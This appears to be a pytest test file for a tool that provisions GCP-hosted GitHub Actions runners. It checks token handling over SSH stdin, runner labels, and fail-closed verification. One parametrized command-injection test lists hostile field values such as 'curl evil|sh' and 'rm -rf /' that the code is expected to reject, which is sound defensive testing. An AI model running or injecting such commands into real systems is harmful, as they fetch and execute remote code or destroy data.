"""Tests for gcp_runner.py (issue #1546).

GCP-native GitHub Actions runner provisioning + registration. These assert the
security-critical behaviors the #1546 preflight requires: the registration token
travels only over the ``gcloud compute ssh`` stdin stream (never argv,
``--command``, ``--token``, Terraform, metadata, Secret Manager, or logs), the
runner registers with ``--no-default-labels`` + a custom label so it cannot pick
up bare ``self-hosted`` jobs, and the automated path fails closed unless the
runner is online with the expected label.
"""

import json
from unittest.mock import MagicMock

import pytest


@pytest.fixture(autouse=True)
def _no_sleep(monkeypatch):
    """Never really sleep: readiness/online polling loops use time.sleep."""
    monkeypatch.setattr("time.sleep", lambda *_a, **_k: None)


def _cfg(labels="gcp-dev"):
    from gcp_runner import GcpRunnerConfig

    return GcpRunnerConfig(
        env="gcp-dev",
        project_id="my-gcp-proj",
        region="us-central1",
        zone="us-central1-a",
        github_org="my-org",
        github_repo="my-repo",
        labels=labels,
    )


def _target(labels="gcp-dev"):
    from gcp_runner import GcpRunnerTarget

    return GcpRunnerTarget(
        instance_name="shifter-gcp-runner-1",
        runner_name="shifter-gcp-runner-1",
        repo_url="https://github.com/my-org/my-repo",
        project_id="my-gcp-proj",
        zone="us-central1-a",
        labels=labels,
    )


def _fake_run_cmd(runner_statuses=None):
    """run_cmd side_effect keyed by subprocess shape (mirrors test_runner)."""
    statuses = runner_statuses or {
        "shifter-gcp-runner-1": {"status": "online", "labels": ["gcp-dev"]},
        "shifter-gcp-runner-2": {"status": "online", "labels": ["gcp-dev"]},
    }

    def _se(cmd, **kwargs):
        joined = " ".join(cmd)
        if "registration-token" in joined:
            return MagicMock(stdout="regtok\n")
        if "output" in cmd and "-json" in cmd:
            return MagicMock(
                stdout=json.dumps(
                    {
                        "runner_instance_names": {"value": list(statuses.keys())},
                        "runner_names": {"value": list(statuses.keys())},
                    }
                )
            )
        if "actions/runners" in joined:
            runners = [
                {"name": n, "status": s["status"], "labels": [{"name": lbl} for lbl in s["labels"]]}
                for n, s in statuses.items()
            ]
            return MagicMock(stdout=json.dumps(runners))
        # gh auth status / gcloud prereqs / ssh readiness probe.
        return MagicMock(stdout="", returncode=0)

    return _se


def _tf_root(tmp_path):
    tf_dir = tmp_path / "platform" / "terraform" / "gcp" / "global" / "github-runner"
    tf_dir.mkdir(parents=True)
    return tf_dir


class TestGcpRunnerConfig:
    """Config factory defaults the runner label to the environment name."""

    def test_factory_defaults_label_to_env(self, mock_gcp_deploy):
        from gcp_runner import get_gcp_runner_config

        config = get_gcp_runner_config(
            env="gcp-dev",
            project_id="p",
            region="us-central1",
            zone="us-central1-a",
            github_org="o",
            github_repo="r",
        )
        assert config.labels == "gcp-dev"

    def test_factory_keeps_explicit_label(self, mock_gcp_deploy):
        from gcp_runner import get_gcp_runner_config

        config = get_gcp_runner_config(
            env="gcp-dev",
            project_id="p",
            region="us-central1",
            zone="us-central1-a",
            github_org="o",
            github_repo="r",
            labels="gcp-dev-x64",
        )
        assert config.labels == "gcp-dev-x64"


class TestRegisterRunner:
    """Registration hands the token to config.sh over SSH stdin only."""

    def test_dry_run_mints_nothing_and_opens_no_session(self, mock_gcp_deploy):
        from gcp_runner import register_runner

        register_runner(_cfg(), _target(), dry_run=True)

        mock_gcp_deploy.run_cmd.assert_not_called()
        mock_gcp_deploy.run_cmd_secret_stdin.assert_not_called()

    def test_token_travels_over_stdin_not_argv_or_command(self, mock_gcp_deploy):
        from gcp_runner import register_runner

        mock_gcp_deploy.run_cmd.return_value = MagicMock(stdout="SECRETTOK\n")  # mint
        mock_gcp_deploy.run_cmd_secret_stdin.return_value = 0

        rc = register_runner(_cfg(), _target())

        assert rc == 0
        call = mock_gcp_deploy.run_cmd_secret_stdin.call_args
        argv = call[0][0]
        # The token is the stdin payload, never on the command line.
        assert call.kwargs["secret_stdin"].strip() == "SECRETTOK"
        assert "SECRETTOK" not in " ".join(argv)
        # IAP-tunneled gcloud ssh with a static, token-free remote command.
        assert argv[0] == "gcloud"
        assert "compute" in argv and "ssh" in argv
        assert "--tunnel-through-iap" in argv
        remote = argv[argv.index("--command") + 1]
        assert "config.sh" in remote
        assert "--no-default-labels" in remote
        # The token VALUE never appears in the command; --token references the
        # stdin-fed temp file via command substitution, not a literal.
        assert "SECRETTOK" not in remote
        assert '--token "$(cat "$TOKFILE")"' in remote

    def test_remote_command_carries_no_token_literal(self, mock_gcp_deploy):
        from gcp_runner import _registration_remote_command

        remote = _registration_remote_command(_target())

        assert "config.sh" in remote
        assert "svc.sh" in remote
        assert "--unattended" in remote
        assert "--no-default-labels" in remote
        # The token is read from the stdin-fed temp file via command substitution,
        # never embedded as a literal in the command string.
        assert 'cat > "$TOKFILE"' in remote  # token captured from SSH stdin
        assert '--token "$(cat "$TOKFILE")"' in remote  # sourced from the temp file
        assert "mktemp" in remote and "rm -f" in remote  # temp token file cleaned up
        assert "set +x" in remote  # no shell tracing around the token
        assert "set -x" not in remote

    def test_registration_uses_config_label(self, mock_gcp_deploy):
        from gcp_runner import _registration_remote_command

        remote = _registration_remote_command(_target(labels="gcp-dev"))
        assert "--labels gcp-dev" in remote
        assert "self-hosted" not in remote

    @pytest.mark.parametrize(
        "field,value",
        [
            ("labels", "gcp-dev; curl evil|sh"),
            ("labels", 'gcp-dev"$(reboot)'),
            ("runner_name", "r1 && rm -rf /"),
            ("work_folder", "sh`id`"),
            ("repo_url", "https://github.com/o/r; echo pwned"),
        ],
    )
    def test_shell_metacharacters_in_fields_are_rejected(self, mock_gcp_deploy, field, value):
        # A crafted label / name / repo url must not be able to break out of the
        # root remote shell command (command-injection guard).
        from gcp_runner import _registration_remote_command

        target = _target()
        setattr(target, field, value)
        with pytest.raises(ValueError):
            _registration_remote_command(target)


class TestVerifyRunners:
    """Verification reports both online status and labels via the GitHub API."""

    def test_dry_run_skips_api(self, mock_gcp_deploy):
        from gcp_runner import verify_runners

        assert verify_runners(_cfg(), ["shifter-gcp-runner-1"], dry_run=True) == {}
        mock_gcp_deploy.run_cmd.assert_not_called()

    def test_returns_status_and_labels(self, mock_gcp_deploy):
        from gcp_runner import verify_runners

        mock_gcp_deploy.run_cmd.return_value = MagicMock(
            stdout=json.dumps([{"name": "shifter-gcp-runner-1", "status": "online", "labels": [{"name": "gcp-dev"}]}])
        )

        res = verify_runners(_cfg(), ["shifter-gcp-runner-1"])

        assert res["shifter-gcp-runner-1"]["status"] == "online"
        assert "gcp-dev" in res["shifter-gcp-runner-1"]["labels"]
        argv = mock_gcp_deploy.run_cmd.call_args[0][0]
        assert argv[0] == "gh"
        assert any("repos/my-org/my-repo/actions/runners" in a for a in argv)


class TestRegistrationFailures:
    """Fail closed unless registration succeeded and the runner is online + labeled."""

    def test_clean_when_online_with_expected_label(self, mock_gcp_deploy):
        from gcp_runner import _registration_failures

        problems = _registration_failures(
            {"r1": 0},
            {"r1": {"status": "online", "labels": ["gcp-dev"]}},
            ["r1"],
            "gcp-dev",
        )
        assert problems == []

    def test_nonzero_registration_exit_is_problem(self, mock_gcp_deploy):
        from gcp_runner import _registration_failures

        problems = _registration_failures(
            {"r1": 1},
            {"r1": {"status": "online", "labels": ["gcp-dev"]}},
            ["r1"],
            "gcp-dev",
        )
        assert len(problems) == 1 and "r1" in problems[0]

    def test_offline_runner_is_problem(self, mock_gcp_deploy):
        from gcp_runner import _registration_failures

        problems = _registration_failures(
            {"r1": 0},
            {"r1": {"status": "offline", "labels": ["gcp-dev"]}},
            ["r1"],
            "gcp-dev",
        )
        assert len(problems) == 1

    def test_missing_expected_label_is_problem(self, mock_gcp_deploy):
        from gcp_runner import _registration_failures

        problems = _registration_failures(
            {"r1": 0},
            {"r1": {"status": "online", "labels": ["self-hosted"]}},
            ["r1"],
            "gcp-dev",
        )
        assert len(problems) == 1 and "r1" in problems[0]

    def test_missing_runner_is_problem(self, mock_gcp_deploy):
        from gcp_runner import _registration_failures

        problems = _registration_failures({"r1": 0}, {}, ["r1"], "gcp-dev")
        assert len(problems) == 1


class TestApplyRunnerTerraform:
    """Terraform apply carries the project id but never a registration token."""

    def test_dry_run_passes_project_and_no_token(self, mock_gcp_deploy):
        from gcp_runner import apply_runner_terraform

        apply_runner_terraform(_cfg(), dry_run=True)

        for call in mock_gcp_deploy.run_cmd.call_args_list:
            for element in call[0][0]:
                assert "token" not in element.lower()
        all_args = [a for call in mock_gcp_deploy.run_cmd.call_args_list for a in call[0][0]]
        assert any("project_id=my-gcp-proj" in a for a in all_args)
        # The dedicated network is mandatory (no create_runner_network opt-out).
        assert not any("create_runner_network" in a for a in all_args)


class TestProvisionAndRegister:
    """End-to-end (mocked-subprocess) apply -> register -> verify orchestration."""

    def test_dry_run_mints_no_token_and_opens_no_session(self, mock_gcp_deploy):
        from gcp_runner import provision_and_register_gcp_runners

        result = provision_and_register_gcp_runners(_cfg(), dry_run=True)

        assert result == {"targets": [], "verified": {}}
        mock_gcp_deploy.run_cmd_secret_stdin.assert_not_called()
        all_args = [a for call in mock_gcp_deploy.run_cmd.call_args_list for a in call[0][0]]
        assert any("terraform" in a for a in all_args)
        assert not any("registration-token" in a for a in all_args)

    def test_success_path_returns_online_fleet(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path
        mock_gcp_deploy.run_cmd.side_effect = _fake_run_cmd()
        mock_gcp_deploy.run_cmd_secret_stdin.return_value = 0

        result = provision_and_register_gcp_runners(_cfg(), dry_run=False)

        assert result["targets"] == ["shifter-gcp-runner-1", "shifter-gcp-runner-2"]

    def test_fails_closed_on_registration_exit(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path
        mock_gcp_deploy.run_cmd.side_effect = _fake_run_cmd()
        mock_gcp_deploy.run_cmd_secret_stdin.return_value = 1  # registration handoff failed

        cfg = _cfg()
        with pytest.raises(SystemExit):
            provision_and_register_gcp_runners(cfg, dry_run=False)

    def test_fails_closed_on_offline_runner(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path
        mock_gcp_deploy.run_cmd.side_effect = _fake_run_cmd(
            runner_statuses={
                "shifter-gcp-runner-1": {"status": "offline", "labels": ["gcp-dev"]},
                "shifter-gcp-runner-2": {"status": "online", "labels": ["gcp-dev"]},
            }
        )
        mock_gcp_deploy.run_cmd_secret_stdin.return_value = 0

        cfg = _cfg()
        with pytest.raises(SystemExit):
            provision_and_register_gcp_runners(cfg, dry_run=False)

    def test_fails_closed_on_missing_label(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path
        mock_gcp_deploy.run_cmd.side_effect = _fake_run_cmd(
            runner_statuses={
                "shifter-gcp-runner-1": {"status": "online", "labels": ["self-hosted"]},
                "shifter-gcp-runner-2": {"status": "online", "labels": ["gcp-dev"]},
            }
        )
        mock_gcp_deploy.run_cmd_secret_stdin.return_value = 0

        cfg = _cfg()
        with pytest.raises(SystemExit):
            provision_and_register_gcp_runners(cfg, dry_run=False)

    def test_no_targets_exits(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path

        def _no_targets(cmd, **kwargs):
            if "output" in cmd and "-json" in cmd:
                return MagicMock(
                    stdout=json.dumps({"runner_instance_names": {"value": []}, "runner_names": {"value": []}})
                )
            return MagicMock(stdout="", returncode=0)

        mock_gcp_deploy.run_cmd.side_effect = _no_targets

        cfg = _cfg()
        with pytest.raises(SystemExit):
            provision_and_register_gcp_runners(cfg, dry_run=False)


class TestPrerequisites:
    """Provisioning fails closed before any mutation without gh auth + gcloud ADC."""

    def test_missing_gh_auth_fails_closed(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path

        def _gh_unauthed(cmd, **kwargs):
            if cmd[:3] == ["gh", "auth", "status"]:
                return MagicMock(returncode=1)
            return MagicMock(returncode=0, stdout="")

        mock_gcp_deploy.run_cmd.side_effect = _gh_unauthed

        cfg = _cfg()
        with pytest.raises(SystemExit):
            provision_and_register_gcp_runners(cfg, dry_run=False)
        # Must fail before Terraform mutation or any registration handoff.
        mock_gcp_deploy.run_cmd_secret_stdin.assert_not_called()
        all_args = [a for call in mock_gcp_deploy.run_cmd.call_args_list for a in call[0][0]]
        assert "apply" not in all_args

    def test_missing_gcloud_adc_fails_closed(self, mock_gcp_deploy, tmp_path):
        from gcp_runner import provision_and_register_gcp_runners

        _tf_root(tmp_path)
        mock_gcp_deploy.get_repo_root.return_value = tmp_path

        def _no_adc(cmd, **kwargs):
            if cmd[:2] == ["gcloud", "auth"]:
                return MagicMock(returncode=1)
            return MagicMock(returncode=0, stdout="")

        mock_gcp_deploy.run_cmd.side_effect = _no_adc

        cfg = _cfg()
        with pytest.raises(SystemExit):
            provision_and_register_gcp_runners(cfg, dry_run=False)


class TestWaitForRunnerSsh:
    """A RUNNING instance is not readiness; unreachable IAP SSH fails closed."""

    def test_unreachable_ssh_fails_closed(self, mock_gcp_deploy, monkeypatch):
        import gcp_runner

        # Never sleep for real; the readiness probe always fails.
        monkeypatch.setattr(gcp_runner.time, "sleep", lambda *_: None)
        mock_gcp_deploy.run_cmd.return_value = MagicMock(returncode=255, stdout="")

        target_2 = _target()
        with pytest.raises(SystemExit):
            gcp_runner.wait_for_runner_ssh(target_2)
